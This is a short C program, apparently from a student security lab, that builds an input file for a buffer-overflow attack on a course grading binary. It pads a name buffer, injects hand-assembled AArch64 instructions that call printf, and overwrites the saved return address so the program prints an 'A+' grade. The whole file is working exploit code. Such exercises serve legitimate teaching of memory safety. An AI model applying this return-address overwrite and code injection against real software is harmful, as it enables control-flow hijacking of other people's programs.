/* Authors: Rohan Amin and Alex Luo 
   createdataAplus.c */
#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, branch, bl, strb;
   unsigned long movLocation;
   psFile = fopen("dataAplus", "w");
   /* Puts truncated name in the buf array */ 
   fputs("Rolex",psFile);   
   putc('\0', psFile);

   /* Puts A in buf array to be printed */ 
   putc('A', psFile); 

   /* Filler in the buf array with null bytes */ 
   for (i = 0; i < 17; i++)
      putc('\0', psFile);    

   /* Branch and link to printf with A as parameter */ 
   adr = MiniAssembler_adr(0, 0x42005e, 0x420070);
   bl = MiniAssembler_bl(0x400600, 0x420074);
      
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&bl, sizeof(unsigned int), 1, psFile);

   /* printf parameters with + as grade (A already printed) */
   mov = MiniAssembler_mov(0, '+');
   adr = MiniAssembler_adr(1,0x420044,0x42007c) ;
   strb = MiniAssembler_strb(0, 1); 
   branch = MiniAssembler_b(0x400864,0x420084);

   /* Location of printf call to overwrite getName x30 address */
   movLocation = 0x420070;
   
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);
   fwrite(&branch, sizeof(unsigned int), 1, psFile);
   fwrite (&movLocation, sizeof(unsigned long), 1, psFile);    

   fclose(psFile);
   return 0;

}
